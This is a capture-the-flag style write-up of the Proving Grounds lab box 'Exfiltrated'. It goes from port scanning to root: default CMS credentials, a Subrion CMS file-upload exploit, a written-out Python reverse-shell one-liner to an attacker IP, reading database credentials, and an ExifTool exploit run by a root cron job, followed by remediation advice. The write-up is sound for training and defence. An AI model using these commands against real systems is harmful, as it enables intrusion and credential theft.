# Proving Grounds Practice – Exfiltrated
**Difficulty:** Medium  
**Category:** Linux / Web / RCE / Privilege Escalation  
**Platform:** Offensive Security Proving Grounds – Practice  
**Goal:** Foothold via Subrion CMS (CVE-2018-19422) → Root via ExifTool RCE (CVE-2021-22204)

# 1. Reconnaissance

## Full Port Scan
```bash
nmap -p- --min-rate 5000 -oA tcpall 192.168.153.163 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-04 15:00 EEST
Nmap scan report for 192.168.153.163 (192.168.153.163)
Host is up (0.056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.71 seconds
```

**Open Ports**
| Port | Service |
|------|---------|
| 22   | SSH     |
| 80   | HTTP    |

---

## Service Enumeration
```bash
nmap -p 22,80 -sC -sV -oA scriptscan 192.168.153.163 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-04 15:01 EEST
Nmap scan report for 192.168.153.163 (192.168.153.163)
Host is up (0.056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.72 seconds
```

**Findings:**
- Apache/2.4.41 (Ubuntu)
- Redirects to `http://exfiltrated.offsec/`
- `robots.txt` exposes:
  ```
  /backup/ /cron/ /front/ /install/ /panel/ /tmp/ /updates/
  ```
- Likely Subrion CMS.

---

# 2. Web Enumeration

## Gobuster
Content responses varied in size → brute-force using status-code filtering:

```bash
gobuster dir -u http://exfiltrated.offsec/ -w wordlist.txt -b 404 -x php,txt
```

Multiple CMS paths confirmed.

---

# 3. Initial Access – Subrion CMS Login

Tried the default credentials:

```
admin : admin
```

**Login successful** at:
```
http://exfiltrated.offsec/panel/
```

This strongly suggests the target is vulnerable to a known Subrion CMS exploit.

---

# 4. Foothold – Subrion CMS RCE (CVE-2018-19422)

Searchsploit:
```
searchsploit subrion
```

Exploit used:
```
python3 cve-2018-19422.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
```

**Exploit Output Highlights**
- CSRF token obtained
- Authenticated successfully
- Webshell uploaded (`.phar` bypass)
- Shell URL:  
  `http://exfiltrated.offsec/panel/uploads/<random>.phar`

Verification:
```bash
$ id
uid=33(www-data) gid=33(www-data)
```

---

# 5. Reverse Shell
Used Python reverse shell:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.203",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Stable shell obtained as **www-data**.

---

# 6. Privilege Escalation – Enumeration

## LinPEAS Execution
Transferred via Python HTTP server:

```bash
python3 -m http.server 80
```

No immediate kernel or sudo escalation paths.

---

# 7. Database Credential Extraction

Viewing CMS config:
```bash
cat /var/www/html/subrion/includes/config.inc.php
```

Credentials discovered:

```
DBUSER: subrionuser
DBPASS: target100
```

Logged in:
```bash
mysql -u subrionuser -ptarget100
```

Enumerated users:
```sql
select username,password from sbr421_members;
```

Password reuse did not lead to root.

---

# 8. Cron Job Discovery

In `/opt/metadata/`, cron executes **exiftool** on uploaded files:

```php
exiftool <uploaded_file>
```

Dangerous: exiftool is known exploitable (CVE-2021-22204).

---

# 9. Root PrivEsc – ExifTool RCE (CVE-2021-22204)

Check version:
```bash
exiftool -ver
11.88
```

Version is vulnerable.

Exploit reference:  
- https://www.exploit-db.com/exploits/50911  
- https://github.com/UNICORDev/exploit-CVE-2021-22204

Install required packages:
```bash
sudo apt install djvulibre-bin exiftool
```

Testing with PoC verified code execution **as root**.

Example output:
```
uid=0(root) gid=0(root)
```

---

# 10. Full Root Shell

Uploaded malicious payload to uploads directory:
```bash
wget http://192.168.45.217/image.jpg
```

Cron triggered it automatically:
```bash
cat /opt/metadata/<hash>
uid=0(root) gid=0(root)
```

Generated reverse-shell payload → root shell received.

**Root compromise complete.**

---

# 11. Attack Path Summary

1. Default credentials → Subrion CMS admin panel  
2. File upload bypass → RCE (CVE-2018-19422)  
3. Shell as www-data  
4. Cronjob executing exiftool as root  
5. ExifTool RCE (CVE-2021-22204) → root shell  

**Impact:** Full compromise of system, database, and file system.

---

# Tools Used

- Nmap  
- Gobuster  
- Subrion exploit (CVE-2018-19422)  
- LinPEAS  
- ExifTool exploit (CVE-2021-22204)  
- Python reverse shell  
- MySQL client

---

# Remediation

### Subrion CMS:
- Update to latest version  
- Remove default credentials  
- Restrict `/panel` to internal IPs  
- Harden upload validation (block `.phar`)  

### ExifTool:
- Upgrade to patched version ≥ 12.24  
- Never process user uploads as root  
- Restrict cron tasks  

### General:
- Principle of least privilege  
- Input validation  
- Disable dangerous PHP functions  
- Monitor abnormal cron executions

---

# Status
✔️ **Completed**  
✔️ **Safe to publish (PG Practice box)**  
✔️ **Contains no flags / sensitive live data**
